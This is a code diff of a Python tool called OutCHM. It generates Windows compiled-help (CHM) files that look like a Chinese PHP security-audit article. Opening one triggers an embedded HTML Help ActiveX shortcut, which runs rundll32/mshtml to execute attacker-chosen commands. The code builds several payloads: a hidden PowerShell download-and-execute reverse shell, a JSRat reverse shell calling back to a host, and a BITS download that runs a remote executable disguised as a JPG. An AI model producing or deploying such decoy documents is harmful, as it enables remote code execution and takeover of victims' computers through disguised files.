@@ -2,159 +2,25 @@
 # -*- coding:utf-8-*-
 
 import sys
+reload(sys)
+sys.setdefaultencoding('utf-8')
 import os
 import argparse
 
-parser=argparse.ArgumentParser(
-prog='OutCHM', 
-formatter_class=argparse.RawDescriptionHelpFormatter,
-description='''OutCHM can create OUT a CHM！ 
-
-OutCHM.py -r http://192.168.0.100:8080
-OutCHM.py -p 'whoami > c://1.txt'
-
-''', 
-epilog='Faster!')
-parser.add_argument('-p', '--payload', help='-p c:\\\windows\\\command')
-parser.add_argument('-r', '--rshell', help='-r http://192.168.0.100:8080，powershell reverse shell，need msf exploit(web_delivery)')
-parser.add_argument('-j', '--jsrat', help='-j http://192.168.0.100:8000，JS reverse shell，need JSRat.py -i 192.168.0.100 -p 8000')
-parser.add_argument('-d', '--download', help='-d http://exp.com/rat.exe，lucky to see u Downloader!')
-# parser.add_argument('-c', '--custom', help='-c http://192.168.0.100/exp.txt 执行在线脚本')
-parser.add_argument('-o', '--outfile', help='-o exp.chm', default='exp.chm')
-parser.add_argument('-dec', '--decompile', help='decompile chm file')
-args=parser.parse_args()
-
-if len(sys.argv) < 1:
-    sys.exit(1)
-
-if args.decompile is not None:
-    os.system('hh -decompile out {0}'.format(args.decompile))
-    print 'decompiled to 「out」 dir。'
-    sys.exit(0)
-
-command=' '
-
-if args.payload is not None:
-    command='javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("' + args.payload + '",0,true);'
-
-if args.rshell is not None:
-    command='javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString(&#39;'+args.rshell+'&#39;));&cmd /c taskkill /f /im rundll32.exe",0,true);'
-    
-if args.jsrat is not None:
-    command='javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","' + args.jsrat + '/connect",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}'
-
-if args.download is not None:
-  command='javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell.exe Import-Module BitsTransfer;Start-BitsTransfer '+ args.download +' C:\\\\ProgramData\\\\write.jpg;cmd.exe /c C:\\\\ProgramData\\\\write.jpg;cmd /c taskkill /f /im rundll32.exe",0,true);'
-
-# if args.custom is not None:
-  # command='javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("' + args.custom + '");'
-
-
-if command == ' ':
-    print 'Error: args.any == None'
-    sys.exit(0)
-
-exp_htm='''<!DOCTYPE html><html>
-    <META content="text/html; charset=unicode" http-equiv=Content-Type>
-    <head><title>高级PHP应用程序漏洞审核技术</title><head></head><body>
-    
-<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
-<PARAM name="Command" value="ShortCut">
- <PARAM name="Button" value="Bitmap::shortcut">
- <PARAM name="Item1" value=',rundll32.exe,{0}'>
- <PARAM name="Item2" value="273,1,1">
-</OBJECT>
-高级PHP应用程序漏洞审核技术
-exported from https://code.google.com/p/pasc2at/wiki/SimplifiedChinese
-<SCRIPT>
-x.Click();
-</SCRIPT>
-'''.format(command)
-# print exp_htm
-
-exp_hhp='''[OPTIONS]
-Language=0x804
-title=PHP Coding
-Default topic=exp.htm 
-Contents file=exp.hhc
-Index file=exp.hhk
-Compiled file={0}
-'''.format(args.outfile)
-# print exp_hhp
-
-exp_hhk='''
-<!-- Index.hhk -->
-<html>
-<body>
-<UL>
-       <LI> <OBJECT type="text/sitemap">
-              <param name="Name" value="display_Index">
-              <param name="Local" value="exp.htm">
-              </OJBECT>
-</UL>
-</body>
-</html>
-'''
-
-exp_hhc='''<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML//EN">
-<HTML>
-<HEAD>
-<meta name="GENERATOR" content="Microsoft&reg; HTML Help Workshop 4.1">
-<!-- Sitemap 1.0 -->
-</HEAD><BODY>
-  <UL>
-  <LI> <OBJECT type="text/sitemap">
-      <param name="Name" value="Index">
-      <param name="Local" value="exp.htm">
-  </OBJECT>
-  </UL>
-  <UL>
-  <LI> <OBJECT type="text/sitemap">
-      <param name="Name" value="PHP Coding">
-      <param name="Local" value="php.htm">
-  </OBJECT>
-  </UL>
-  <UL>
-  <LI> <OBJECT type="text/sitemap">
-      <param name="Name" value="IPv4 Alternate Configuration Tab">
-      <param name="Local" value="php.htm">
-  </OBJECT>
-  </UL>
-  <UL>
-  <LI> <OBJECT type="text/sitemap">
-      <param name="Name" value="IPv4 and IPv6 Advanced DNS Tab">
-      <param name="Local" value="php.htm">
-  </OBJECT>
-  </UL>
-</BODY>
-</HTML>
-'''
-
-php_htm='''
+php_htm_default='''
 <!DOCTYPE html>
 <META content="text/html; charset=unicode" http-equiv=Content-Type>
 <p></p><ol><li>summary Php Application Source Code Audits Advanced Technology - Simplified Chinese</li></ol>
 <table id="user-content-toc" summary="Contents"><tbody><tr><td><div id="user-content-toctitle"><h2><a id="user-content-table-of-contents" class="anchor" href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#table-of-contents" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Table of Contents</h2></div><ul><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#PHP">高级PHP应用程序漏洞审核技术</a><ul><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#">前言</a></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#-2">传统的代码审计技术</a></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#PHP-2">PHP版本与应用代码审计</a></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#-3">其他的因素与应用代码审计</a></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#-4">扩展我们的字典</a><ul><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#key">变量本身的key</a></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#-5">变量覆盖</a><ul><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#-6">遍历初始化变量</a></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#parse_str">parse_str()变量覆盖漏洞</a></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#import_request_variables">import_request_variables()变量覆盖漏洞</a></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#PHP5_Globals">PHP5 Globals</a></li></ul></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#magic_quotes_gpc">magic_quotes_gpc与代码安全</a><ul><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#magic_quotes_gpc-2">什么是magic_quotes_gpc</a></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#-7">哪些地方没有魔术引号的保护</a></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#-8">变量的编码与解码</a></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#-9">二次攻击</a></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#-10">魔术引号带来的新的安全问题</a></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#key-2">变量key与魔术引号</a></li></ul></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#-11">代码注射</a><ul><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#PHP-3">PHP中可能导致代码注射的函数</a></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#-12">变量函数与双引号</a></li></ul></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#PHP-4">PHP自身函数漏洞及缺陷</a><ul><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#PHP-5">PHP函数的溢出漏洞</a></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#PHP-6">PHP函数的其他漏洞</a></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#session_destroy">session_destroy()删除文件漏洞</a></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#-13">随机函数</a></li></ul></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#-14">特殊字符</a><ul><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#-15">截断</a><ul><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#include">include截断</a></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#-16">数据截断</a></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#-17">文件操作里的特殊字符</a></li></ul></li></ul></li></ul></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#-18">怎么进一步寻找新的字典</a></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#DEMO">DEMO</a></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#-19">后话</a></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#-20">附录</a></li></ul></li></ul></td></tr></tbody></table>
 <p></p><h1><a id="user-content-高级php应用程序漏洞审核技术" class="anchor" href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#高级php应用程序漏洞审核技术" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><a name="user-content-PHP"></a>高级PHP应用程序漏洞审核技术</h1>
-
-
-
 <p>&lt;wiki:toc max_depth="5"&gt;&lt;/wiki:toc&gt;
 </p>
-
 <h2><a id="user-content-前言" class="anchor" href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#前言" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><a name=""></a>前言</h2>
-
-
-
 <p>PHP是一种被广泛使用的脚本语言，尤其适合于web开发。具有跨平台，容易学习，功能强大等特点，据统计全世界有超过34%的网站有php的应用，包括Yahoo、sina、163、sohu等大型门户网站。而且很多具名的web应用系统（包括bbs,blog,wiki,cms等等）都是使用php开发的，Discuz、phpwind、phpbb、vbb、wordpress、boblog等等。随着web安全的热点升级，php应用程序的代码安全问题也逐步兴盛起来，越来越多的安全人员投入到这个领域，越来越多的应用程序代码漏洞被披露。针对这样一个状况，很多应用程序的官方都成立了安全部门，或者雇佣安全人员进行代码审计，因此出现了很多自动化商业化的代码审计工具。也就是这样的形势导致了一个局面：大公司的产品安全系数大大的提高，那些很明显的漏洞基本灭绝了，那些大家都知道的审计技术都无用武之地了。我们面对很多工具以及大牛扫描过n遍的代码，有很多的安全人员有点悲观，而有的官方安全人员也非常的放心自己的代码，但是不要忘记了“没有绝对的安全”，我们应该去寻找新的途径挖掘新的漏洞。本文就给介绍了一些非传统的技术经验和大家分享。
 </p>
 <p>另外在这里特别说明一下本文里面很多漏洞都是来源于网络上牛人和朋友们的分享，在这里需要感谢他们 ：）
 </p>
-
 <h2><a id="user-content-传统的代码审计技术" class="anchor" href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#传统的代码审计技术" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><a name="user-content--2"></a>传统的代码审计技术</h2>
-
-
-
 <p>WEB应用程序漏洞查找基本上是围绕两个元素展开：变量与函数。也就是说一漏洞的利用必须把你提交的恶意代码通过变量经过n次变量转换传递，最终传递给目标函数执行，还记得MS那句经典的名言吗？“一切输入都是有害的”。这句话只强调了变量输入，很多程序员把“输入”理解为只是gpc`[`$`_`GET,$`_`POST,$`_`COOKIE`]`，但是变量在传递过程产生了n多的变化。导致很多过滤只是个“纸老虎”！我们换句话来描叙下代码安全：“一切进入函数的变量是有害的”。
 </p>
 <p>PHP代码审计技术用的最多也是目前的主力方法：静态分析，主要也是通过查找容易导致安全漏洞的危险函数，常用的如grep，findstr等搜索工具，很多自动化工具也是使用正则来搜索这些函数。下面列举一些常用的函数，也就是下文说的字典（暂略）。但是目前基本已有的字典很难找到漏洞，所以我们需要扩展我们的字典，这些字典也是本文主要探讨的。
@@ -833,6 +699,129 @@ PHP5的$`_`SERVER变量缺少magic_quotes_gpc的保护，导致近年来X-Forwar
 </body><div></div><div></div></html>
 '''
 
+parser=argparse.ArgumentParser(
+prog='OutCHM', 
+formatter_class=argparse.RawDescriptionHelpFormatter,
+description='''OutCHM can create OUT a CHM！ 
+
+OutCHM.py -r http://192.168.0.100:8080
+OutCHM.py -p 'whoami > c://1.txt'
+
+''', 
+epilog='Faster!')
+parser.add_argument('-p', '--payload', help='-p c:\\\windows\\\command')
+parser.add_argument('-r', '--rshell', help='-r http://192.168.0.100:8080，powershell reverse shell，need msf> exploit(web_delivery)')
+parser.add_argument('-j', '--jsrat', help='-j http://192.168.0.100:8000，JS reverse shell，need JSRat.py -i 192.168.0.100 -p 8000')
+parser.add_argument('-d', '--download', help='-d http://exp.com/rat.exe，lucky to see u Downloader!')
+parser.add_argument('-o', '--outfile', help='-o exp.chm', default='exp.chm')
+parser.add_argument('-dec', '--decompile', help='decompile .CHM file to OUT directory')
+
+parser.add_argument('-t', '--title', help='', default='PHP Coding')
+parser.add_argument('-i1', '--index1', help='index1的目錄', default='PHP Coding')
+parser.add_argument('-i2', '--index2', help='index2的目錄', default='高级PHP应用程序漏洞审核技术')
+parser.add_argument('-ic1', '--index1_content', help='打开页面的文字内容，中文乱码尚未解决', default='------------------------------------\nWelcome！')
+parser.add_argument('-ic2', '--index2_content', help='-ic2 任意填充文件', default=php_htm_default)
+
+args=parser.parse_args()
+
+php_htm=php_htm_default
+if args.index2_content != php_htm_default: #如果不等於默認==如果輸入了命令
+    php_htm=''
+    with open(args.index2_content) as f:
+        for line in f:
+            php_htm=php_htm+line
+
+if args.decompile is not None:
+    os.system('hh -decompile OUT {0}'.format(args.decompile))
+    print 'decompiled to OUT directory'
+    sys.exit(0)
+
+command=' '
+
+if args.payload is not None:
+    command='javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("' + args.payload + '",0,true);'
+
+if args.rshell is not None:
+    command='javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString(&#39;' + args.rshell + '&#39;));&cmd /c taskkill /f /im rundll32.exe",0,true);'
+    
+if args.jsrat is not None:
+    command='javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","' + args.jsrat + '/connect",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}'
+
+if args.download is not None:
+    command='javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell.exe Import-Module BitsTransfer;Start-BitsTransfer '+ args.download +' C:\\\\ProgramData\\\\write.jpg;cmd.exe /c C:\\\\ProgramData\\\\write.jpg;cmd /c taskkill /f /im rundll32.exe",0,true);'
+
+# if args.custom is not None:
+  # command='javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("' + args.custom + '");'
+
+if command == ' ':
+    parser.print_help()
+    sys.exit(0)
+
+exp_htm='''<!DOCTYPE html><html>
+    <META content="text/html; charset=unicode" http-equiv=Content-Type>
+    <head><title>高级PHP应用程序漏洞审核技术</title><head></head><body>
+    
+<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
+<PARAM name="Command" value="ShortCut">
+ <PARAM name="Button" value="Bitmap::shortcut">
+ <PARAM name="Item1" value=',rundll32.exe,{0}'>
+ <PARAM name="Item2" value="273,1,1">
+</OBJECT>
+{1}
+<SCRIPT>
+x.Click();
+</SCRIPT>
+'''.format(command, args.index1_content)
+# print exp_htm
+
+exp_hhp='''[OPTIONS]
+Language=0x804
+title={0}
+Default topic=exp.htm 
+Contents file=exp.hhc
+Index file=exp.hhk
+Compiled file={1}
+'''.format(args.title, args.outfile)
+# print exp_hhp
+
+exp_hhk='''
+<!-- Index.hhk -->
+<html>
+<body>
+<UL>
+       <LI> <OBJECT type="text/sitemap">
+              <param name="Name" value="display_Index">
+              <param name="Local" value="exp.htm">
+              </OJBECT>
+</UL>
+</body>
+</html>
+'''
+
+exp_hhc='''<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML//EN">
+<HTML>
+<HEAD>
+<meta name="GENERATOR" content="Microsoft&reg; HTML Help Workshop 4.1">
+<!-- Sitemap 1.0 -->
+</HEAD><BODY>
+  <UL>
+  <LI> <OBJECT type="text/sitemap">
+      <param name="Name" value="{0}">
+      <param name="Local" value="exp.htm">
+  </OBJECT>
+  </UL>
+  <UL>
+  <LI> <OBJECT type="text/sitemap">
+      <param name="Name" value="{1}">
+      <param name="Local" value="php.htm">
+  </OBJECT>
+  </UL>
+</BODY>
+</HTML>
+'''.format(args.index1, args.index2)
+
+
+
 # print exp_htm, exp_hhc, exp_hhk, exp_hhp
 # print php_htm
 
@@ -853,4 +842,3 @@ os.remove('exp.hhc')
 os.remove('exp.hhk')
 os.remove('exp.hhp')
 os.remove('php.htm')
-
